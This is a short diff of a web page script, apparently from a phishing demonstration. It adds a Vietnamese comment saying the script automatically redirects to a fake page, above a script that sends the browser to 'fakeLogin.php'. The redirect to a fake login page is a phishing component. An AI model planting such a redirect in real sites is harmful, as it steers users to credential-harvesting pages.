@@ -1,3 +1,4 @@
-﻿<script>
+﻿!Script tự động chuyển hướng đến trang giả mạo
+<script>
   window.location.href = "fakeLogin.php";
 </script>
